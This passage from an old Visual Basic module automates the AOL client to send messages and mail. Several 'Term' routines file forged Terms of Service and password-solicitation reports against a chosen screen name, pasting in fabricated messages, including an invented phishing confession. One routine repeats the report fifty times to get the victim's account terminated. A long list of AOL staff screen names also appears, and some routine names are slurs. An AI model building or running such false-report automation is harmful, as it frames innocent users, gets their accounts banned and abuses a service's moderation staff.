b = findchildbyclass(x, "RICHCNTL") 'Find msg area
What = Message
c = sendmessagebystring(b, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_ICON")  'Find one of the
            'buttons
e = getnextwindow(d, 2) 'Next Button
F = getnextwindow(e, 2) 'Next
g = getnextwindow(F, 2) '
h = getnextwindow(g, 2) '
i = getnextwindow(h, 2) '
j = getnextwindow(i, 2) '
k = getnextwindow(j, 2) '
L = getnextwindow(k, 2) '
M = getnextwindow(L, 2) '
n = getnextwindow(M, 2) '
x = sendmessagebynum(M, WM_LBUTTONDOWN, 0, 0&) 'Click send
pause .5
x = sendmessagebynum(M, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
    Off% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Off%, WM_CLOSE, 0, 0)
Loop Until Off% <> 0
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)
Exit Sub
End If
If aolver = 25 Then
Call SendIM25(who, Message)
Exit Sub
End If
End Sub

Sub SendIM25 (who, Message)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
What = Message
cl = getnextwindow(b, 2)
c = sendmessagebystring(cl, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_Button")  'Find one of the
            'buttons
x = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Click send
'pause .5
x = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
    Offf% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Offf%, WM_CLOSE, 0, 0)
Loop Until Offf% <> 0
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)

End Sub

Sub SendIMa25 (who, Message)
a = findwindow("AOL Frame25", 0&)  'Find AOL
Call RunMenuByString(a, "Send an Instant Message")'Run Menu
Do: DoEvents
x = findchildbytitle(a, "Send Instant Message") 'Find IM
bye = findchildbytitle(a, "Send Instant Message")
If x <> 0 Then Exit Do
Loop
b = findchildbyclass(x, "_AOL_EDIT") 'Put the SN in the IM
to_who = who
c = sendmessagebystring(b, WM_SETTEXT, 0, to_who)
What = Message
cl = getnextwindow(b, 2)
c = sendmessagebystring(cl, WM_SETTEXT, 0, What) 'Put msg in



d = findchildbyclass(x, "_AOL_Button")  'Find one of the
            'buttons
x = sendmessagebynum(d, WM_LBUTTONDOWN, 0, 0&) 'Click send
'pause .5
x = sendmessagebynum(d, WM_LBUTTONUP, 0, 0&)
    timeout (.3)
    Offf% = findwindow("#32770", "America Online")
        x = sendmessagebynum(Offf%, WM_CLOSE, 0, 0)
x = sendmessagebynum(bye, WM_CLOSE, 0, 0)

End Sub

Sub sendirc (ByVal txt As String)
Let AOL% = findwindow("mIRC", 0&)
Let EDT% = findchildbyclass(AOL%, "Edit")
Let Message$ = txt
For i = 1 To 1
  Let AAA% = sendmessagebystring(EDT%, WM_SETTEXT, 0, Message$)
  Let BBB% = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
  subcd0 (.001)
Next i
Let AOL% = findwindow("mIRC32", 0&)
Let EDT% = findchildbyclass(AOL%, "Edit")
Let Message$ = txt
For i = 1 To 1
  Let AAA% = sendmessagebystring(EDT%, WM_SETTEXT, 0, Message$)
  Let BBB% = sendmessagebynum(EDT%, WM_CHAR, 13, 0)
  subcd0 (.001)
Next i

End Sub

Sub SendMail (person, subject, Message)
AOL% = findwindow("AOL Frame25", 0&)
If AOL% = 1 Then
        msg = msg & "Please Sign On First"
        response = MsgBox(msg, 47)
    
    Exit Sub
End If
Call RunMenuByString(AOL%, "Compose Mail")

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
icone% = findchildbyclass(mailwin%, "_AOL_Icon")
peepz% = findchildbyclass(mailwin%, "_AOL_Edit")
subjt% = findchildbytitle(mailwin%, "Subject:")
subjec% = GetWindow(subjt%, 2)
Mess% = findchildbyclass(mailwin%, "RICHCNTL")
If icone% <> 0 And peepz% <> 0 And subjec% <> 0 And Mess% <> 0 Then Exit Do
Loop

a = sendmessagebystring(peepz%, WM_SETTEXT, 0, person)
a = sendmessagebystring(subjec%, WM_SETTEXT, 0, subject)
a = sendmessagebystring(Mess%, WM_SETTEXT, 0, Message)
b% = findchildbyclass(mailwin%, "_AOL_ICON")
x = sendmessagebynum(b%, WM_LBUTTONDOWN, 0, 0&)
x = sendmessagebynum(b%, WM_LBUTTONUP, 0, 0&)
subcd0 (.5)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)

'AOLIcon (icone%)

Do: DoEvents
AOL% = findwindow("AOL Frame25", 0&)
MDI% = findchildbyclass(AOL%, "MDIClient")
mailwin% = findchildbytitle(MDI%, "Compose Mail")
erro% = findchildbytitle(MDI%, "Error")
aolw% = findwindow("#32770", "America Online")
If mailwin% = 0 Then Exit Do
If aolw% <> 0 Then
a = SendMessage(aolw%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
If erro% <> 0 Then
a = SendMessage(erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop

End Sub

Sub SendPW (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Do
DoEvents
RPS% = findchildbytitle(AOL%, "Report Password Solicitations")
Loop Until RPS% > 0
SN% = GetWindow(findchildbytitle(RPS%, "Screen Name of Member Soliciting Your Information:"), GW_HWNDNEXT)
Solic% = GetWindow(findchildbytitle(RPS%, "Copy and Paste the solicitation here:"), GW_HWNDNEXT)
Call SetEdit(SN%, UCase$(who))
Call SetEdit(Solic%, who + ":" + Chr$(9) + Phrase)
sends% = findchildbytitle(RPS%, "Send")
click sends%
Call waitforok
Call CloseWin(Sent%)
Call CloseWin(RPS%)
End Sub

Sub sendroom (ByVal txt As String)
DoEvents
AOLEdit% = findchildbyclass(findchatroom(), "_AOL_Edit")
Call SetEdit(AOLEdit%, txt$)
Call Enter(AOLEdit%)
DoEvents
End Sub

Sub sendtag (ByVal txt As String)
'sendroom "•—BD ÷ v¹·º -[ " + txt
'sendroom "•—BD ÷ v²·º -[ " + txt
'sendroom "•—BD ÷ v³·º- [ " + txt
'sendroom "•—BD ÷ v4·º -[ " + txt
'sendroom "•—BD [pro] ÷ v¹·º-[ " + txt
'sendroom "•÷:·· BD -pro- v¹·¹ ··:[ " + txt
sendroom "•••··· BD [ultra] v¹·º [ " + txt
'sendroom ¦›::BD [pro] ÷ v5·º::‹¦ + txt
'sendroom "•—BD ÷ v³·º-[ultimate]-[ "
'sendroom "•—BD ÷ v³·º-[enterprise]-[ " + txt
'sendroom "•—BD ÷ v³·º-[silver]-[ "
'sendroom "•—BD ÷ v³·º-[gold]-[ "
'sendroom "•—BD ÷ v³·º-[final]-[ "

End Sub

Sub sendtext (ByVal txt As String)
x = findsn() 'Calls our custon get Screen Name Function
name1$ = x
Mess$ = txt$
AOL% = findwindow("AOL Frame25", 0&)
View% = findchildbyclass(AOL%, "_AOL_VIEW")
SendMe$ = CStr(Chr(13) & Chr(10) & name1$ + ":" & Chr(9) & Mess$)
change% = sendmessagebystring(View%, WM_SETTEXT, 0, SendMe$)

End Sub

Sub sendttext (handl As Integer, msgg As String)
'Sends msgg to handl
send_txt = sendmessagebystring(handl, WM_SETTEXT, 0, msgg)
End Sub

Sub SetEdit (AOLEdit%, ByVal txt$)
x = sendmessagebystring(AOLEdit%, WM_SETTEXT, 0, txt$)
End Sub

Sub ShowAOL ()
a = findwindow("AOL Frame25", 0&)
    x = ShowWindow(a, SW_Show)
End Sub

Sub showaolwins ()
'Shows all AOL Windows
fc = findchildbyclass(aolhwnd(), "AOL Child")
req = ShowWindow(fc, 1)
faa = fc

Do
DoEvents
Let faf = faa
faa = getnextwindow(faa, 2)
res = ShowWindow(faa, 1)
DoEvents
Loop Until faf = faa


End Sub

Sub stayontop (Frm As Form)
'Allows a window to stay on top
Dim success%
success% = SetWindowPos(Frm.hWnd, HWND_TOPMOST, 0, 0, 0, 0, Flags)

End Sub

Sub subcd0 (p06F2 As Variant)
Dim l06F6 As Variant
l06F6 = Timer
Do While Timer - l06F6 <= p06F2
DoEvents
Loop
End Sub

Sub Termcat (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = GetWindow(GetWindow(findchildbyclass(Help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon%
Do
DoEvents
RAV% = findchildbytitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
CAT% = GetWindow(findchildbytitle(RAV%, "Other TOS" & Chr$(13) & "Questions"), GW_HWNDNEXT)
click CAT%
Do
DoEvents
CATWrite% = findchildbytitle(AOL%, "Write to Community Action Team")
Loop Until CATWrite% <> 0
AOLEdit% = findchildbyclass(CATWrite%, "_AOL_Edit")
sends% = findchildbytitle(CATWrite%, "Send")
Call SetEdit(AOLEdit%, "I recieved this instant message at " + gettime() + "." + Chr$(13) + Chr$(10) + who + ":" + Chr$(9) + Phrase)
click sends%
Call waitforok
Call CloseWin(Help%)
Call CloseWin(RAV%)
End Sub

Sub TermChatVio (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = GetWindow(findchildbyclass(Help%, "_AOL_Icon"), GW_HWNDNEXT)
click AOLIcon%
Do
DoEvents
Notify% = findchildbytitle(AOL%, "Notify AOL")
Notify% = findchildbyclass(Notify%, "_AOL_Edit")
Notify% = getparent(Notify%)
Loop Until Notify% <> 0
ROOMNAME% = findchildbyclass(Notify%, "_AOL_Edit")
TimeDate% = GetWindow(ROOMNAME%, GW_HWNDNEXT)
person% = GetWindow(GetWindow(TimeDate%, GW_HWNDNEXT), GW_HWNDNEXT)
Text% = GetWindow(GetWindow(GetWindow(person%, GW_HWNDNEXT), GW_HWNDNEXT), GW_HWNDNEXT)
sends% = findchildbyclass(Notify%, "_AOL_View")
sends% = GetWindow(GetWindow(GetWindow(sends%, GW_HWNDNEXT), GW_HWNDNEXT), GW_HWNDNEXT)
Call SetEdit(ROOMNAME%, "Lobby " & Int(Rnd * 200) + 1)
Call SetEdit(TimeDate%, gettime() + " " + Date)
Call SetEdit(person%, who)
Call SetEdit(Text%, Phrase)
click sends%
Call waitforok
Call CloseWin(Notify%)
Call CloseWin(Help%)
End Sub

Sub TermGay (who)
Randomize Timer
x = Int(Rnd * 6) + 1
If x = 1 Then Phrase$ = Phrase$ + "SuP! "
If x = 2 Then Phrase$ = Phrase$ + "Hey Man! "
If x = 3 Then Phrase$ = Phrase$ + "SuP d00d! "
If x = 4 Then Phrase$ = Phrase$ + "Hi Man! "
If x = 5 Then Phrase$ = Phrase$ + "SuP Man! "
If x = 6 Then Phrase$ = Phrase$ + "Hola! "
x = Int(Rnd * 5) + 1
If x = 1 Then Phrase$ = Phrase$ + "Listen d00d "
If x = 2 Then Phrase$ = Phrase$ + "Listen Man "
If x = 3 Then Phrase$ = Phrase$ + "Dood... "
If x = 4 Then Phrase$ = Phrase$ + "Shit Listen... "
If x = 5 Then Phrase$ = Phrase$ + "Fuck man, "
x = Int(Rnd * 4) + 1
If x = 1 Then Phrase$ = Phrase$ + "I got only one this phish left and I need more "
If x = 2 Then Phrase$ = Phrase$ + "I'm runnin real low on phish "
If x = 3 Then Phrase$ = Phrase$ + "This is my last phish "
If x = 4 Then Phrase$ = Phrase$ + "My entire phish log got deleted"
Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + who + ":" + Chr$(9)
x = Int(Rnd * 4) + 1
If x = 1 Then Phrase$ = Phrase$ + "Can I have that account? "
If x = 2 Then Phrase$ = Phrase$ + "Cud ya give me the Password to that account. "
If x = 3 Then Phrase$ = Phrase$ + "Man please gimme the PW to that SN. "
If x = 4 Then Phrase$ = Phrase$ + "I sware i'll give you more accounts if you just give me that one so I can go phishing on it. "
x = Int(Rnd * 2) + 1
If x = 1 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx Man "
If x = 2 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx d00d "



AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = findchildbyclass(Help%, "_AOL_Icon")
click AOLIcon%
'Call SendPW(who, phrase)

AOLIcon% = GetWindow(GetWindow(findchildbyclass(Help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon%
Do
DoEvents
RAV% = findchildbytitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
IM% = GetWindow(findchildbytitle(RAV%, "IM" & Chr$(13) & "Violation"), GW_HWNDNEXT)
click IM%
Do
DoEvents
VVIM% = findchildbytitle(AOL%, "Violations via Instant Messages")
Loop Until VVIM% <> 0
VioDate% = findchildbyclass(VVIM%, "_AOL_Edit")
VioTime% = GetWindow(findchildbytitle(VVIM%, "Time AM/PM"), GW_HWNDNEXT)
VioMess% = GetWindow(findchildbytitle(VVIM%, "CUT and PASTE a copy of the IM here"), GW_HWNDNEXT)

CurTime$ = gettime()
Call SetEdit(VioDate%, Date)
Call SetEdit(VioTime%, CurTime$)
Call SetEdit(VioMess%, whoe$ + ":" + Chr$(9) + phrasee$)
sends% = findchildbytitle(VVIM%, "Send")
click sends%
Call waitforok
Call CloseWin(Help%)
Call CloseWin(RAV%)
End Sub

Sub TermGP (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "GuidePager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = findchildbyclass(Help%, "_AOL_Icon")
click AOLIcon%
Call SendPW(who, Phrase)
Call CloseWin(Help%)

End Sub

Sub TermIMVio (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = GetWindow(GetWindow(findchildbyclass(Help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon%
Do
DoEvents
RAV% = findchildbytitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
IM% = GetWindow(findchildbytitle(RAV%, "IM" & Chr$(13) & "Violation"), GW_HWNDNEXT)
click IM%
Do
DoEvents
VVIM% = findchildbytitle(AOL%, "Violations via Instant Messages")
Loop Until VVIM% <> 0
VioDate% = findchildbyclass(VVIM%, "_AOL_Edit")
VioTime% = GetWindow(findchildbytitle(VVIM%, "Time AM/PM"), GW_HWNDNEXT)
VioMess% = GetWindow(findchildbytitle(VVIM%, "CUT and PASTE a copy of the IM here"), GW_HWNDNEXT)
Randomize Timer
CurTime$ = gettime()
Call SetEdit(VioDate%, Date)
Call SetEdit(VioTime%, CurTime$)
Call SetEdit(VioMess%, who + ":" + Chr$(9) + Phrase)
sends% = findchildbytitle(VVIM%, "Send")
click sends%
Call waitforok
Call CloseWin(Help%)
Call CloseWin(RAV%)
End Sub

Sub TermKidsOnly (who, Phrase)
invokes "40-22619"
Do: DoEvents
a = findwindow("AOL Frame25", 0&)
b = findchildbytitle(a, "GUIDEPAGER FOR KIDS")
c = findchildbyclass(b, "_AOL_Icon")
d = getnextwindow(c, 2)
e = getnextwindow(d, 2)
click (e)
Call SendPW(who, Phrase)
Loop Until b <> 0
CloseWin (b)
End Sub

Sub TermKO (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "KO Help"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = findchildbyclass(Help%, "_AOL_Icon")
click AOLIcon%
Call SendPW(who, Phrase)
Call CloseWin(Help%)
End Sub

Sub TermMulti (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = findchildbyclass(Help%, "_AOL_Icon")

For x = 1 To 3
click AOLIcon%
Call SendPW(who, Phrase)
Next x
End Sub

Sub TermNoStop (who, Phrase)
AOL% = findwindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
Help% = findchildbytitle(AOL%, "I Need Help!")
Loop Until Help% <> 0
AOLIcon% = findchildbyclass(Help%, "_AOL_Icon")

For x = 1 To 50
click AOLIcon%
Call SendPW(who, Phrase)
Next x

End Sub

Sub TermSP (who, Phrase)
    AOL% = findwindow("AOL Frame25", 0&)
    Menu% = Getmenu(AOL%)
    buffer$ = Space(256)
    x = GetMenuString(Menu%, 0, buffer$, 256, &H400)
    buffer$ = FixAPIString(buffer$)
    If buffer$ <> "*" Then Exit Sub
    'a% = RunMenuByString(aol%, "Invoke Database Record...")
    invokes "40-22620"
    
    Do
    DoEvents
    StaffPager% = findchildbytitle(AOL%, "GUIDEPAGER FOR STAFF MEMBERS")
    Loop Until StaffPager% <> 0
    AOLIcon% = GetWindow(findchildbytitle(StaffPager%, "Report" + Chr$(13) + "Password" + Chr$(13) + "Solicitation"), GW_HWNDNEXT)
    click AOLIcon%
    Call CloseWin(InvokeWin%)
    Call SendPW(who, Phrase)
    Call CloseWin(StaffPager%)
End Sub

Sub Text_Spaced (strin As String, Text As TextBox)
Let inptxt = strin
Let lenth = Len(inptxt)
Do While numspc <= lenth
Let numspc = numspc + 1
Let nextchr = Mid(inptxt, numspc, 1)
Let nextchr = nextchr + " "
Let newsent = newsent + nextchr
Loop
Text.Text = newsent

End Sub

Sub timeout (p06F2 As Variant)
Dim l06F6 As Variant
l06F6 = Timer
Do While Timer - l06F6 <= p06F2
DoEvents
Loop
End Sub

Sub TOS_AddNames (List As Control)
List.AddItem "AOLTechDOC"
List.AddItem "AOLTechUPC"
List.AddItem "Guide AFK"
List.AddItem "Guide AFK"
List.AddItem "Guide AIR"
List.AddItem "Guide ANS"
List.AddItem "Guide ARG"
List.AddItem "Guide ATV"
List.AddItem "Guide AYE"
List.AddItem "Guide Bash"
List.AddItem "Guide BDG"
List.AddItem "Guide BEE"
List.AddItem "Guide BOB"
List.AddItem "Guide BPD"
List.AddItem "Guide CZY"
List.AddItem "Guide DNR"
List.AddItem "Guide DOK"
List.AddItem "Guide DZY"
List.AddItem "Guide EEK"
List.AddItem "Guide EIR"
List.AddItem "Guide ER"
List.AddItem "Guide EZY"
List.AddItem "Guide FOX"
List.AddItem "Guide FRG"
List.AddItem "Guide GAL"
List.AddItem "Guide GCM"
List.AddItem "Guide GEZ"
List.AddItem "Guide GIG"
List.AddItem "Guide GRY"
List.AddItem "Guide HAM"
List.AddItem "Guide HAP"
List.AddItem "Guide HAY"
List.AddItem "Guide HL"
List.AddItem "Guide HRS"
List.AddItem "Guide HUN"
List.AddItem "Guide IAM"
List.AddItem "Guide IDK"
List.AddItem "Guide ILY"
List.AddItem "Guide IZZ"
List.AddItem "Guide JS"
List.AddItem "Guide JW"
List.AddItem "Guide LAF"
List.AddItem "Guide LBR"
List.AddItem "Guide LBW"
List.AddItem "Guide LGT"
List.AddItem "Guide LNK"
List.AddItem "Guide LYN"
List.AddItem "Guide MAS"
List.AddItem "Guide MUG"
List.AddItem "Guide NAC"
List.AddItem "Guide NYM"
List.AddItem "Guide NYX"
List.AddItem "Guide OE"
List.AddItem "Guide OOH"
List.AddItem "Guide PA"
List.AddItem "Guide PAM"
List.AddItem "Guide PDX"
List.AddItem "Guide PET"
List.AddItem "Guide PLT"
List.AddItem "Guide PST"
List.AddItem "Guide QED"
List.AddItem "Guide QIZ"
List.AddItem "Guide RAM"
List.AddItem "Guide RAQ"
List.AddItem "Guide RJM"
List.AddItem "Guide RLT"
List.AddItem "Guide RLW"
List.AddItem "Guide RUG"
List.AddItem "Guide SJU"
List.AddItem "Guide SLW"
List.AddItem "Guide SQK"
List.AddItem "Guide STU"
List.AddItem "Guide SUE"
List.AddItem "Guide TAX"
List.AddItem "Guide TBG"
List.AddItem "Guide TOM"
List.AddItem "Guide TRX"
List.AddItem "Guide TWA"
List.AddItem "Guide TXT"
List.AddItem "Guide VIC"
List.AddItem "Guide VIN"
List.AddItem "Guide WAY"
List.AddItem "GuideUK LM"
List.AddItem "GuideUKMgr"
List.AddItem "HOST   727"
List.AddItem "Host   912"
List.AddItem "HOST AJBG"
List.AddItem "Host Amby"
List.AddItem "Host Ank"
List.AddItem "Host AT3"
List.AddItem "Host Baloo"
List.AddItem "Host BLdg"
List.AddItem "Host CAL"
List.AddItem "Host Caro"
List.AddItem "HOST Chris"
List.AddItem "Host Dad"
List.AddItem "HOST DE"
List.AddItem "Host Ditto"
List.AddItem "Host DMB"
List.AddItem "Host Dru"
List.AddItem "HOST DUH"
List.AddItem "Host Elise"
List.AddItem "Host Eyes"
List.AddItem "Host Fidd"
List.AddItem "Host Flyer"
List.AddItem "Host Gvhe4"
List.AddItem "Host Hugh"
List.AddItem "Host Huny"
List.AddItem "HOST IRADJ"
List.AddItem "Host Jas"
List.AddItem "HOST KEITH"
List.AddItem "Host Kelly"
List.AddItem "Host L5963"
List.AddItem "Host Laina"
List.AddItem "Host Lali"
List.AddItem "Host Lil"
List.AddItem "Host Longy"
List.AddItem "Host Lthr"
List.AddItem "Host Lucky"
List.AddItem "HOST Margo"
List.AddItem "Host ME"
List.AddItem "Host Moon"
List.AddItem "Host Myth"
List.AddItem "Host NC"
List.AddItem "Host Neil"
List.AddItem "HOST NOAH"
List.AddItem "HOST OBB"
List.AddItem "Host Oct"
List.AddItem "Host OFF"
List.AddItem "HOST Pinky"
List.AddItem "Host Priz"
List.AddItem "Host Re"
List.AddItem "Host Tigg"
List.AddItem "Host Tom"
List.AddItem "Host Triad"
List.AddItem "Host Winks"
List.AddItem "HostBCBear"
List.AddItem "HostCvrGrl"
List.AddItem "HostMars"
List.AddItem "HostWolf"
List.AddItem "HostWWF682"
List.AddItem "HostWWFBec"
List.AddItem "KO Apo"
List.AddItem "KO Athene"
List.AddItem "KO Banshee"
List.AddItem "KO Banshee"
List.AddItem "KO Boo"
List.AddItem "KO Bren"
List.AddItem "KO Caracal"
List.AddItem "KO COA"
List.AddItem "KO CoCo"
List.AddItem "KO Creepy"
List.AddItem "KO Dan"
List.AddItem "KO Dance"
List.AddItem "KO Doll"
List.AddItem "KO EXIST"
List.AddItem "KO FLLYER"
List.AddItem "KO Harley"
List.AddItem "KO Haunted"
List.AddItem "KO Herent"
List.AddItem "KO Irish"
List.AddItem "KO JAKS"
List.AddItem "KO Kate"
List.AddItem "KO Kitty"
List.AddItem "KO Konuts"
List.AddItem "KO Lady"
List.AddItem "KO Leggo"
List.AddItem "KO LEXUS"
List.AddItem "KO Linda"
List.AddItem "KO Lucky"
List.AddItem "KO MacLeod"
List.AddItem "KO Marlene"
List.AddItem "KO Michael"
List.AddItem "KO Minnie"
List.AddItem "KO Mirage"
List.AddItem "KO Nagi"
List.AddItem "KO PARTE"
List.AddItem "KO Paul"
List.AddItem "KO Pooky"
List.AddItem "KO QUIPS"
List.AddItem "KO Ruby"
List.AddItem "KO Scare"
List.AddItem "KO Silly"
List.AddItem "KO Sunny"
List.AddItem "KO Thumper"
List.AddItem "KO TriX"
List.AddItem "KO Typo M"
List.AddItem "KO Vampire"
List.AddItem "MHMS  756"
List.AddItem "MHMS ANN"
List.AddItem "MHMS AOK"
List.AddItem "MHMS ARCH"
List.AddItem "MHMS ASL"
List.AddItem "MHMS BOY"
List.AddItem "MHMS BRW"
List.AddItem "MHMS BUG"
List.AddItem "MHMS CCH"
List.AddItem "MHMS CFD"
List.AddItem "MHMS CHF"
List.AddItem "MHMS DDG"
List.AddItem "MHMS DEE"
List.AddItem "MHMS DGW"
List.AddItem "MHMS DJT"
List.AddItem "MHMS DMG"
List.AddItem "MHMS DWN"
List.AddItem "MHMS FOX"
List.AddItem "MHMS GRL"
List.AddItem "MHMS HOO"
List.AddItem "MHMS ICU"
List.AddItem "MHMS JIM"
List.AddItem "MHMS JMH"
List.AddItem "MHMS JMM"
List.AddItem "MHMS JMY"
List.AddItem "MHMS JSB"
List.AddItem "MHMS JSC"
List.AddItem "MHMS KAE"
List.AddItem "MHMS KEV"
List.AddItem "MHMS KNG"
List.AddItem "MHMS LAH"
List.AddItem "MHMS LYN"
List.AddItem "MHMS MDM"
List.AddItem "MHMS MDP"
List.AddItem "MHMS MGB"
List.AddItem "MHMS MIK"
List.AddItem "MHMS MMB"
List.AddItem "MHMS ODE"
List.AddItem "MHMS OWL"
List.AddItem "MHMS PAL"
List.AddItem "MHMS PBT"
List.AddItem "MHMS PEN"
List.AddItem "MHMS PUP"
List.AddItem "MHMS QWK"
List.AddItem "MHMS REB"
List.AddItem "MHMS REI"
List.AddItem "MHMS RMB"
List.AddItem "MHMS ROK"
List.AddItem "MHMS SCH"
List.AddItem "MHMS SEM"
List.AddItem "MHMS SHA"
List.AddItem "MHMS TFB"
List.AddItem "MHMS TKO"
List.AddItem "MHMS TLC"
List.AddItem "MHMS TLN"
List.AddItem "MHMS TNJ"
List.AddItem "MHMS TNX"
List.AddItem "MHMS TVG"
List.AddItem "MHMS TWO"
List.AddItem "MHMS VIN"
List.AddItem "MHMS WIL"
List.AddItem "MHMS WOW"
List.AddItem "MHMS XTR"
List.AddItem "MHMS YTR"
List.AddItem "MHMS ZZI"
List.AddItem "Lotsen AM"
List.AddItem "Lotsen HO"
List.AddItem "Lotsen MI"
List.AddItem "Lotsen BC"
List.AddItem "Lotsen GB"
List.AddItem "Lotsen WU"
List.AddItem "Lotsen PR"
List.AddItem "Lotsen TT"
List.AddItem "Lotsen SU"
List.AddItem "Lotsen MP"
List.AddItem "Lotsen IA"
List.AddItem "Lotsen SG"
List.AddItem "Lotsen ON"
List.AddItem "Lotsen HO"
List.AddItem "Lotsen BM"
List.AddItem "Lotsen FO"
List.AddItem "Lotsen MN"
List.AddItem "Lotsen AW"
List.AddItem "Lotsen AM"
List.AddItem "Lotsen GP"
List.AddItem "Lotsen AS"
List.AddItem "Lotsen EW"
List.AddItem "Lotsen BE"
List.AddItem "Lotsen AA"
List.AddItem "Lotsen MR"
List.AddItem "Lotsen MC"
List.AddItem "Lotsen AP"
List.AddItem "Lotsen BJ"
List.AddItem "Lotsen FH"
List.AddItem "Lotsen MS"
List.AddItem "Lotsen RM"
List.AddItem "Lotsen SR"
List.AddItem "Lotsen DI"
List.AddItem "Lotsen CH"
List.AddItem "Lotsen MF"
List.AddItem "Lotsen HB"
List.AddItem "Lotsen MT"
List.AddItem "Lotsen MM"
List.AddItem "Lotsen RT"
List.AddItem "Lotsen TY"
List.AddItem "Lotsen UW"
List.AddItem "Lotsen KA"
List.AddItem "Lotsen CM"
List.AddItem "Lotsen DO"
List.AddItem "Lotsen BA"
List.AddItem "Lotsen LI"
List.AddItem "Lotsen GG"
List.AddItem "Lotsen VL"
List.AddItem "Lotsen PH"
List.AddItem "Lotsen JM"
List.AddItem "Lotsen SN"
List.AddItem "Lotsen RO"
List.AddItem "Lotsen SA"
List.AddItem "Lotsen SH"
List.AddItem "Lotsen GA"
List.AddItem "Lotsen PN"
List.AddItem "Lotsen AB"
List.AddItem "Lotsen JT"
List.AddItem "Lotsen JW"
List.AddItem "Lotsen MH"
List.AddItem "Lotsen VP"
List.AddItem "Lotsen UB"
List.AddItem "Lotsen OM"
List.AddItem "Lotsen DE"
List.AddItem "Lotsen GD"
List.AddItem "Lotsen CG"
List.AddItem "Lotsen PA"
List.AddItem "Lotsen"
List.AddItem "TOSGeneral"
List.AddItem "TOS Kids"
List.AddItem "TOSNames1"
List.AddItem "TOSGen2"
List.AddItem "TOSGeneral"
List.AddItem "TOSEMail1"
List.AddItem "TOSIM1"
List.AddItem "TOSBoards1"
List.AddItem "TOSGen2"
List.AddItem "TOSAdvisor"
List.AddItem "TOSDonC"
List.AddItem "TLA DJP"
List.AddItem "TLA ECA"
List.AddItem "MHMS ZMN"
List.AddItem "MHMS SEM"
List.AddItem "MHMS MPX"
List.AddItem "MHMS ROY"
List.AddItem "MHMS TNY"
List.AddItem "MHMS REB"
List.AddItem "MHMS TNJ"
List.AddItem "Rnger AMS"
List.AddItem "Rnger AMY"
List.AddItem "Rnger ANN"
List.AddItem "Rnger APP"
List.AddItem "Rnger BJP"
List.AddItem "Rnger BOB"
List.AddItem "Rnger CAR"
List.AddItem "Rnger CAT"
List.AddItem "Rnger CAV"
List.AddItem "Rnger CEO"
List.AddItem "Rnger DAD"
List.AddItem "Rnger DAN"
List.AddItem "Rnger DAZ"
List.AddItem "Rnger DEB"
List.AddItem "Rnger DEN"
List.AddItem "Rnger DMC"
List.AddItem "Rnger DRK"
List.AddItem "Rnger EBE"
List.AddItem "Rnger FRG"
List.AddItem "Rnger FYR"
List.AddItem "Rnger GAL"
List.AddItem "Rnger GER"
List.AddItem "Rnger GGL"
List.AddItem "Rnger GIL"
List.AddItem "Rnger HIQ"
List.AddItem "Rnger HLP"
List.AddItem "Rnger HUG"
List.AddItem "Rnger IAQ"
List.AddItem "Rnger ICE"
List.AddItem "Rnger INF"
List.AddItem "Rnger JBW"
List.AddItem "Rnger JGH"
List.AddItem "Rnger JIM"
